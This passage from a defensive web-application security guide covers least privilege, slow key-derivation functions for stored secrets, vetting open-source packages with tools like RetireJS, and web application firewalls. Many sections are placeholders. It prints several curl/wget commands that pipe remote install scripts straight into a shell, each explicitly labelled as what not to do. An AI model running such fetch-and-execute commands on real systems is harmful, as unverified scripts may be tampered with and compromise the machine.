One of the beauties of GNU/Linux is that you can have as much or little security as you decide. No one has made that decision for you already and locked you out of the source. You are not feed lies like all of the closed source OS vendors trying to pimp their latest money spinning product. GNU/Linux is a dirty little secrete that requires no marketing hype. It just provides complete control if you want it. If you do not know what you want, then someone else will probably take that control from you. It is just a matter of time if it hasn't happened already.

#### Least Privilege
![](images/ThreatTags/PreventionEASY.png)

An application should have the least privileges possible in order to carry out what it needs to do. Consider creating accounts for each trust distinction. For example where you only need to read from a data store, then create that connection with a users credentials that is only allowed to read, and so on for other privileges. This way the attack surface is minimised. Adhering to the principle of least privilege. Also consider removing table access completely from the application and only provide permissions to the application to run stored queries. This way if/when an attacker is able to compromise the machine and retrieve the password for an action on the data-store, they will not be able to do a lot anyway.

#### Location
![](images/ThreatTags/PreventionEASY.png)

Put your services like data-stores on network segments that are as [sheltered](#network-countermeasures-component-placement) as possible and only contain similar services.

Maintain as few user accounts on the servers in question as possible and with the least privileges as possible. 

#### Data-store Compromise {#web-applications-countermeasures-data-store-compromise}
![](images/ThreatTags/PreventionEASY.png)

As part of your defence in depth strategy, you should expect that your data-store is going to get stolen, but hope that it does not. What assets within the data-store are sensitive? How are you going to stop an attacker that has gained access to the data-store from making sense of the sensitive data?

As part of developing the application that uses the data-store, a strategy also needs to be developed and implemented to carry on business as usual when this happens. For example, when your detection mechanisms realise that someone unauthorised has been on the machine(s) that host your data-store, as well as the usual alerts being fired off to the people that are going to investigate and audit, your application should take some automatic measures like:

* All following logins should be instructed to change passwords

If you follow the recommendations below, data-store theft alone will be an inconvenience, but not a disaster.

Consider what sensitive information you really need to store. Consider using the following key derivation functions (KDFs) for all sensitive data. Not just passwords. Also continue to [remind your customers](https://speakerdeck.com/binarymist/passwords-lol) to always use unique passwords that are made up of alphanumeric, upper-case, lower-case and special characters. It is also worth considering pushing the use of high quality password vaults. Do not limit password lengths. Encourage long passwords.

PBKDF2, bcrypt and [scrypt](http://www.tarsnap.com/scrypt.html) are KDFs that are designed to be slow. Used in a process commonly known as key stretching. The process of key stretching in terms of how long it takes can be tuned by increasing or decreasing the number of cycles used. Often 1000 cycles or more for passwords. "_The function used to protect stored credentials should balance attacker and defender verification. The defender needs an acceptable response time for verification of users’ credentials during peak use. However, the time required to map_ `<credential> -> <protected form>` _must remain beyond threats’ hardware (GPU, FPGA) and technique (dictionary-based, brute force, etc) capabilities._"

> OWASP Password Storage

PBKDF2, bcrypt and the newer scrypt, apply a Pseudorandom Function (PRF) such as a cryptographic hash, cipher or HMAC to the data being received along with a unique salt. The salt should be stored with the hashed data.

Do not use MD5, SHA-1 or the SHA-2 family of cryptographic one-way hashing functions by themselves for cryptographic purposes like hashing your sensitive data. In-fact do not use hashing functions at all for this unless they are leveraged with one of the mentioned KDFs. Why? Because the hashing speed can not be slowed as hardware continues to get faster. Many organisations that have had their data-stores stolen and continue to on a weekly basis could avoid their secrets being compromised simply by using a decent KDF with salt and a decent number of iterations.
"_Using four AMD Radeon HD6990 graphics cards, I am able to make about 15.5 billion guesses per second using the SHA-1 algorithm._"

> Per Thorsheim

In saying that, PBKDF2 can use MD5, SHA-1 and the SHA-2 family of hashing functions. Bcrypt uses the Blowfish (more specifically the Eksblowfish) cipher. Scrypt does not have user replaceable parts like PBKDF2. The PRF can not be changed from SHA-256 to something else.

**Which KDF to use?**

This depends on many considerations. I am not going to tell you which is best, because there is no best. Which to use depends on many things. You are going to have to gain understanding into at least all three KDFs. PBKDF2 is the oldest so it is the most battle tested, but there has also been lessons learnt from it that have been taken to the latter two. The next oldest is bcrypt which uses the Eksblowfish cipher which was designed specifically for bcrypt from the blowfish cipher, to be very slow to initiate thus boosting protection against dictionary attacks which were often run on custom Application-specific Integrated Circuits (ASICs) with low gate counts, often found in GPUs of the day (1999).  
The hashing functions that PBKDF2 uses were a lot easier to get speed increases due to ease of parallelisation as opposed to the Eksblowfish cipher attributes such as: far greater memory required for each hash, small and frequent pseudo-random memory accesses, making it harder to cache the data into faster memory. Now with hardware utilising large Field-programmable Gate Arrays (FPGAs), bcrypt brute-forcing is becoming more accessible due to easily obtainable cheap hardware such as:

* [Parallella board](https://www.parallella.org/board/) with Epiphany chip
* [ZedBoard / Zynq 7020](http://picozed.org/product/zedboard)
* [Xeon+FPGA](http://www.extremetech.com/extreme/184828-intel-unveils-new-xeon-chip-with-integrated-fpga-touts-20x-performance-boost)
* [Xeon Phi](http://www.extremetech.com/extreme/133541-intels-64-core-champion-in-depth-on-xeon-phi)
* [Haswell](http://www.theplatform.net/2015/06/02/intel-finishes-haswell-xeon-e5-rollout-launches-broadwell-e3/)

The sensitive data stored within a data-store should be the output of using one of the three key derivation functions we have just discussed. Feed with the data you want protected and a salt. All good frameworks will have at least PBKDF2 and bcrypt APIs

### Lack of Authentication {#web-applications-countermeasures-lack-of-authentication}

_Todo_  
_Todo_   
...

### Cryptography on the Client (AKA Untrusted Crypto) {#web-applications-countermeasures-cryptography-on-the-client}

_Todo_

### Consuming Free and Open Source {#web-applications-countermeasures-consuming-free-and-open-source}
![](images/ThreatTags/PreventionEASY.png)

#### Process

Dibbe Edwards [discusses](https://soundcloud.com/owasp-podcast/dibbe-edwards-devops-and-open-source-at-ibm) some excellent initiatives on how they do it at IBM. I will attempt to paraphrase some of them here:

* Implement process and governance around which open source libraries you can use
* Legal review: checking licenses
* Scanning the code for vulnerabilities, manual and automated code review
* Maintain a list containing all the libraries that have been approved for use.  
If not on the list, make request and it should go through the same process.
* Once the libraries are in your product they should become as part of your own code so that they get the same rigour over them as any of your other code written in-house
* There needs to be automated process that runs over the code base to check that nothing that is not on the approved list is included
* Consider automating some of the suggested tooling options below

There is an excellent paper by the SANS Institute on [Security Concerns in Using Open Source Software
for Enterprise Requirements](http://www.sans.org/reading-room/whitepapers/awareness/security-concerns-open-source-software-enterprise-requirements-1305) that is well worth a read. It confirms what the likes of IBM are doing in regards to their consumption of free and open source libraries.

#### Consumption is Your Responsibility

As a developer, you are responsible for what you install and consume. [Malicious NodeJS packages](https://github.com/joaojeronimo/rimrafall) do end up on NPM from time to time. The same goes for any source or binary you download and run. The following commands are often encountered as being "the way" to install things:

{title="wget", linenos=off}
    # Fetching install.sh and running immediately in your shell.
    # Do not do this. Download first -> Check and verify good -> run if good.
    sh -c "$(wget https://raw.github.com/account/repo/install.sh -O -)"

{title="curl", linenos=off}
    # Fetching install.sh and running immediately in your shell.
    # Do not do this. Download first -> Check and verify good -> run if good.
    sh -c "$(curl -fsSL https://raw.github.com/account/repo/install.sh)"

Below is the [official way](https://github.com/nodesource/distributions) to install NodeJS. Do not do this. `wget` or `curl` first, then make sure what you have just downloaded is not malicious.

A>
A> Inspect the code before you run it.
A>

1. The repository could have been tampered with
2. The transmission from the repository to you could have been intercepted and modified.

{title="curl", linenos=off}
    # Fetching install.sh and running immediately in your shell.
    # Do not do this. Download first -> Check and verify good -> run if good.
    curl -sL https://deb.nodesource.com/setup_4.x | sudo -E bash -
    sudo apt-get install -y nodejs

#### Keeping Safe

##### wget, curl, etc:

Please do not `wget`, `curl` or fetch in any way and pipe what you think is an installer or any script to your shell without first verifying that what you are about to run is not malicious. Do not download and run in the same command.

The better option is to:

1. Verify the source that you are about to download, if all good
2. Download it
3. Check it again, if all good
4. Only then should you run it

##### npm install:

As part of an `npm install`, package creators, maintainers (or even a malicious entity intercepting and modifying your request on the [wire](#network-identify-risks-wire-inspecting)) can define scripts to be run on specific [NPM hooks](https://docs.npmjs.com/misc/scripts). You can check to see if any package has hooks (before installation) that will run scripts by issuing the following command:  
`npm show [module-you-want-to-install] scripts`

Recommended procedure:

1. Verify the source that you are about to download, if all good
2. `npm show [module-you-want-to-install] scripts`
3. Download the module without installing it and inspect it. You can download it from `http://registry.npmjs.org/[module-you-want-to-install]/-/[module-you-want-to-install]-VERSION.tgz`

The most important step here is downloading and inspecting before you run.

##### Doppelganger Packages:

Similarly to [Doppelganger Domains](#network-identify-risks-doppelganger-domains), People often miss-type what they want to install. If you were someone that wanted to do something malicious like have consumers of your package destroy or modify their systems, send sensitive information to you, or any number of other criminal activities (ideally identified in the [Identify Risks](#web-applications-identify-risks-consuming-free-and-open-source) section. If not already, add), doppelganger packages are an excellent avenue for raising the likelihood that someone will install your malicious package by miss typing the name of it with the name of another package that has a very similar name. I covered this in my ["0wn1ng The Web"](https://speakerdeck.com/binarymist/0wn1ng-the-web-at-www-dot-wdcnz-dot-com) presentation, with demos.

Make sure you are typing the correct package name. Copy -> Pasting works.

#### Tooling {#web-applications-countermeasures-consuming-free-and-open-source-tooling}

For **NodeJS developers**: Keep your eye on the [nodesecurity advisories](https://nodesecurity.io/advisories). Identified security issues can be posted to [NodeSecurity report](https://nodesecurity.io/report).

##### [RetireJS](https://github.com/RetireJS/retire.js)

Is useful to help you find JavaScript libraries with known vulnerabilities.  
RetireJS has the following:

1. Command line scanner
    * Excellent for CI builds. Include it in one of your build definitions and let it do the work for you.
      * To install globally:  
      `npm i -g retire`
      * To run it over your project:  
      `retire my-project`  
      Results like the following may be generated:

        {linenos=off}
            public/plugins/jquery/jquery-1.4.4.min.js
            ↳ jquery 1.4.4.min has known vulnerabilities:
            http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-4969
            http://research.insecurelabs.org/jquery/test/
            http://bugs.jquery.com/ticket/11290

    * To install RetireJS locally to your project and run as a git `precommit-hook`.  
    There is an NPM package that can help us with this, called `precommit-hook`, which installs the git `pre-commit` hook into the usual `.git/hooks/pre-commit` file of your projects repository. This will allow us to run any scripts immediately before a commit is issued.  
    Install both packages locally and save to `devDependencies` of your `package.json`. This will make sure that when other team members fetch your code, the same `retire` script will be run on their `pre-commit` action.
    
      {linenos=off}
          npm install precommit-hook --save-dev
          npm install retire --save-dev
        
      If you do not configure the hook via the `package.json` to run specific scripts, it will run `lint`, `validate` and `test` by default. See the RetireJS documentation for options.
    
      {linenos=off, lang=JavaScript}
          {
             "name": "my-project",
             "description": "my project does wiz bang",
             "devDependencies": {
                "retire": "~0.3.2",
                "precommit-hook": "~1.0.7"
             },
             "scripts": {
                "validate": "retire -n -j",
                "test": "a-test-script",
                "lint": "jshint --with --different-options"
             }
          }
        
      Adding the `pre-commit` property allows you to specify which scripts you want run before a successful commit is performed. The following `package.json` defines that the `lint` and `validate` scripts will be run. `validate` runs our `retire` command.
    
      {linenos=off, lang=JavaScript}
          {
             "name": "my-project",
             "description": "my project does wiz bang",
             "devDependencies": {
                "retire": "~0.3.2",
                "precommit-hook": "~1.0.7"
             },
             "scripts": {
                "validate": "retire -n -j",
                "test": "a-test-script",
                "lint": "jshint --with --different-options"
             },
             "pre-commit": ["lint", "validate"]
          }
        
      Keep in mind that `pre-commit` hooks can be very useful for all sorts of checking of things immediately before your code is committed. For example running security tests mentioned previously with the [OWASP ZAP API](#web-applications-development-practices-security-test-driven-development).
2. Chrome extension
3. Firefox extension
4. Grunt plugin
5. Gulp task
6. Burp and OWASP ZAP plugin
7. [On-line tool](http://retire.insecurity.today/) you can simply enter your web applications URL and the resource will be analysed

##### requireSafe

provides "_intentful auditing as a stream of intel for bithound_". I guess watch this space, as in speaking with [Adam Baldwin](https://twitter.com/adam_baldwin), there doesn't appear to be much happening here yet.

##### bithound:

In regards to NPM packages, we know the following things:

1. We know about a small collection of vulnerable NPM packages. Some of which have high fan-in (many packages depend on them).
2. The vulnerable packages have published patched versions
3. Many packages are still consuming the vulnerable unpatched versions of the packages that have published patched versions
  * So although we could have removed a much larger number of vulnerable packages due to their persistence on depending on unpatched packages, we have not. I think this mostly comes down to lack of visibility, awareness and education. This is exactly what I'm trying to change.

bithound supports:

* JavaScript, TypeScript and JSX (back-end and front-end)
* In terms of version control systems, only git is supported
* Opening of bitbucket and github issues
* Providing statistics on code quality, maintainability and stability. I queried Adam on this, but not a lot of information was forth coming.

bithound can be configured to not analyse some files. Very large repositories are prevented from being analysed due to large scale performance issues.

Analyses both NPM and Bower dependencies and notifies you if any are:

* Out of date
* Insecure. Assuming this is based on the known vulnerabilities (41 node advisories at the time of writing this)
* Unused

Analysis of opensource projects are free.

You could of course just list all of your projects and global packages and check that there are none in the [advisories](https://nodesecurity.io/advisories), but this would be more work and who is going to remember to do that all the time?

&nbsp;

For **.Net developers**, there is the likes of [OWASP **SafeNuGet**](https://github.com/OWASP/SafeNuGet).

### Web Application Firewall (WAF) {#web-applications-countermeasures-waf}

[WAFs](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#wafs) are similar to Intrusion Prevention Systems (IPS) except they operate at the [Application Layer](http://en.wikipedia.org/wiki/Application_layer)(HTTP), Layer 7 of the [OSI model](http://en.wikipedia.org/wiki/OSI_model). So they understand the concerns of your web application at a technical level. WAFs protect your application against a large number of attacks, like XSS, CSRF, SQLi, [Local File Inclusion (LFI)](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion), session hijacking, invalid requests (requests to things that do not exist (think 404)). WAFs sit in-line between a gateway and the web application. They run as a proxy. Either on the physical web server or on another network node, but only the traffic directed to the web application is inspected, where as an IDS/IPS inspects all network traffic passed through its interfaces. WAFs use signatures that look like specific vulnerabilities to compare the network traffic targeting the web application and apply the associated rule(s) when matches are detected. Although not only limited to dealing with known signatures, some WAFs can detect and prevent attacks they have not seen before like responses containing larger than specified payloads. Source code of the web application does not have to be modified.

1. [Fusker](https://www.npmjs.com/package/fusker). Not sure if this is still actively maintained. At this point, there has not been any recent commits for about three years, but it does look like the best offering we have at this stage for NodeJS. So if your looking to help a security project out...
2. [express-waf](https://www.npmjs.com/package/express-waf) has recent commits, but there is only a single developer working on it when I checked.
3. [AppSensor](http://appsensor.org/) brings detection -> prevention to your domain level.
  Most applications today just take attacks & fall over.
  I have heard so many times we want our applications to fail securely when they get bad input.
  We do not want our applications being bullied and failing securely.
  We want them to not fail at all in production, but rather defend themselves.
 
  Technically AppSensor is not a WAF because the concepts are used to shape your application logic.

  The project defines a conceptual framework and methodology that offers prescriptive guidance to implement intrusion detection and automated response into your applications. Providing attack awareness baked in, with real-time defences.
  
  AppSensor provides > 50 (signature based) detection points. Provides guidance on how to respond once attack identified. Possible actions include:
    
  * logging out the user
  * locking the account or notifying an administrator
  * more than a dozen response actions are described.

## 4. SSM Risks that Solution Causes

### Lack of Visibility

_Todo_

#### Logging

_Todo_

### Lack of Input Validation and Sanitisation

_Todo_

#### Buffer Overflows

_Todo_

#### Cross-Site Scripting (XSS)

_Todo_

#### SQLi

_Todo_

#### Command Injection

_Todo_

#### LDAP Injection

_Todo_

#### XPath Injection

_Todo_

#### XQuery Injection

_Todo_

#### XSLT Injection

_Todo_

#### XML Injection

_Todo_

### Management of Application Secrets

Reliance on adjacent layers of defence means those layers have to actually be up to scratch. There is a possibility that they will not be.

Possibility of missing secrets being sent over the wire.

Possible reliance on obscurity with many of the strategies I have seen proposed. Just be aware that obscurity may slow an attacker down a little, but it will not stop them.

#### Store Configuration in Configuration files

With moving any secrets from source code to configuration files, there is a possibility that the secrets will not be changed at the same time. If they are not changed, then you have not really helped much, as the secrets are still in source control.

With good configuration tools like node-config, you are provided with plenty of options of splitting up meta-data, creating overrides, storing different parts in different places, etc. There is a risk that you do not use the potential power and flexibility to your best advantage. Learn the ins and outs of what ever system it is you are using and leverage its features to do the best at obscuring your secrets and if possible securing them.

##### node-config

is an excellent configuration package with lots of great features. There is no security provided with node-config, just some potential obscurity. Just be aware of that, and as discussed previously, make sure surrounding layers have beefed up security.

##### Windows:

As is often the case with Microsoft solutions, their marketing often leads people to believe that they have secure solutions to problems when that is not the case. As discussed previously, there are plenty of ways to get around the Microsoft so called security features. As anything else in this space, they may provide some obscurity, but do not depend on them being secure.

Statements like the following have the potential for producing over confidence:

"_vSentry protects desktops without requiring patches or updates, defeating and automatically discarding all known and unknown malware, and eliminating the need for costly remediation._"

Please keep your systems patched and updated.

"_With Bromium micro-virtualization, we now have an answer: A desktop that is utterly secure and a joy to use_"

There is a risk that people will believe this.

##### Linux:

As with Microsofts "virtualisation-based security" Linux containers may slow system compromise down, but a determined attacker will find other ways to get around container isolation. Maintaining a small set of user accounts is a worthwhile practise, but that alone will not be enough to stop a highly skilled and determined attacker moving forward.  
Even when technical security is very good, an experienced attacker will use other mediums to gain what they want, like [social engineering](#people-identify-risks), [physical](#physical-identify-risks) compromise, both, or some other attack vectors listed in this book. Defence in depth is crucial in achieving good security. Concentrating on the lowest hanging fruit first and working your way up the tree.

Locking file permissions and ownership down is good, but that alone will not save you. 

#### Least Privilege

Applying least privilege to everything can take quite a bit of work. Yes, it is probably not that hard to do, but does require a breadth of thought and time. Some of the areas discussed could be missed. Having more than one person working on the task is often effective as each person can bounce ideas off of each other and the other person is likely to notice areas that you may have missed and visa-versa.

#### Location

Segmentation is useful, and a common technique to helping to build resistance against attacks. It does introduce some complexity though. With complexity comes the added likely-hood of introducing a fault. 

#### Data-store Compromise

If you follow the advice in the [countermeasures](#web-applications-countermeasures-data-store-compromise) section, you will be doing more than most other organisations in this area. It is not hard, but if implemented could increase complacency/over confidence. Always be on your guard. Always expect that although you have done a lot to increase your security stance, a determined and experienced attacker is going to push buttons you may have never realised you had. If they want something enough and have the resources and determination to get it, they probably will. This is where you need strategies in place to deal with post compromise. Create process (ideally partly automated) to deal with theft.

Also consider that once an attacker has made off with your data-store, even if it is currently infeasible to brute-force the secrets, there may be other ways around obtaining the missing pieces of information they need. Think about the [paper shredders](#physical-identify-risks-sensitive-printed-matter) and the associated [competitions](http://archive.darpa.mil/shredderchallenge/). With patience, most puzzles can be cracked. If the compromise is an opportunistic type of attack, they will most likely just give up and seek an easier target. If it is a targeted attack by determined and experienced attackers, they will probably try other attack vectors until they get what they want.

Do not let over confidence be your weakness. An attacker will search out the weak link. Do your best to remove weak links.

### Lack of Authentication

_Todo_

### Cryptography on the Client (AKA Untrusted Crypto)

_Todo_

### Consuming Free and Open Source

Some of the packages we consume may have good test coverage, but are the tests testing the right things? Are the tests testing that something can not happen? That is where the likes of RetireJS comes in.

#### Process

There is a danger of implementing to much manual process thus slowing development down more than necessary. The way the process is implemented will have a lot to do with its level of success. For example automating as much as possible, so developers don't have to think about as much as possible is going to make for more productive, focused and [happier](https://en.wikipedia.org/wiki/Kaizen) developers.

For example, when a Development Team needs to pull a library into their project, which often happens in the middle of working on a product backlog item (not planned at the beginning of the Sprint), if they have to context switch while a legal review and/or manual code review takes place, then this will cause friction and reduce the teams performance even though it may be out of their hands.  
In this case, the Development Team really needs a dedicated resource to perform the legal review. The manual review could be done by another team member or even themselves with perhaps another team member having a quicker review after the fact. These sorts of decisions need to be made by the Development Team, not mandated by someone outside of the team that doesn't have skin in the game or does not have the localised understanding that the people working on the project do.

Maintaining a list of the approved libraries really needs to be a process that does not take a lot of human interaction. How ever you work out your process, make sure it does not require a lot of extra developer effort on an ongoing basis. Some effort up front to automate as much as possible will facilitate this.

#### Tooling

Using the likes of pre-commit hooks, the other tooling options detailed in the [Countermeasures](#web-applications-countermeasures-consuming-free-and-open-source) section and creating scripts to do most of the work for us is probably going to be a good option to start with.

### Web Application Firewall (WAF)

_Todo_

## 5. SSM Costs and Trade-offs

### Lack of Visibility

_Todo_

#### Logging

_Todo_

### Lack of Input Validation and Sanitisation

_Todo_

#### Buffer Overflows

_Todo_

#### Cross-Site Scripting (XSS)

_Todo_

#### SQLi

_Todo_

#### Command Injection

_Todo_

#### LDAP Injection

_Todo_

#### XPath Injection

_Todo_

#### XQuery Injection

_Todo_

#### XSLT Injection

_Todo_

#### XML Injection

_Todo_

### Management of Application Secrets

There is potential for hidden costs here, as adjacent layers will need to be hardened. There could be trade-offs here that force us to focus on the adjacent layers. This is never a bad thing though. It helps us to step back and take a holistic view of our security.

#### Store Configuration in Configuration files

There should be little cost in moving secrets out of source code and into configuration files.

##### Windows:

You will need to weigh up whether the effort to obfuscate secrets is worth it or not. It can also make the developers job more cumbersome. Some of the options provided may be worthwhile doing.

##### Linux

Containers have many other advantages and you may already be using them for making your deployment processes easier and less likely to have dependency issues. They also help with scaling and load balancing, so they have multiple benefits.

#### Least Privilege

Is something you should be at least considering and probably doing in every case. It is one of those considerations that is worth while applying to most layers.

#### Location

Segmenting of resources is a common and effective measure to take for at least slowing down attacks and a cost well worth considering if you have not already.

#### Data-store Compromise

The countermeasures discussed here go without saying, although many organisations do not do them well if at all. It is up to you whether you want to be one of the statistics that has all of their secrets revealed. Following the countermeasures here is something that just needs to be done if you have any data that is sensitive in your data-store(s). 

### Lack of Authentication

_Todo_

### Cryptography on the Client (AKA Untrusted Crypto)

_Todo_

### Consuming Free and Open Source

The process has to be streamlined so that it does not get in the developers way. A good way to do this is to ask the developers how it should be done. They know what will get in their way. In order for the process to be a success, the person(s) mandating it will need to get solid buy-in from the people using it (the developers).

The idea of setting up a process that notifies at least the Development Team if a library they want to use has known security defects, needs to be pitched to all stakeholders (developers, product owner, even external stakeholders) the right way. It needs to provide obvious benefit and not make anyones life harder than it already is. Everyone has their own agendas. Rather than fighting against them, include consideration for them in your pitch. I think this sort of a pitch is actually reasonably easy if you keep these factors in mind.

### Web Application Firewall (WAF)

_Todo_
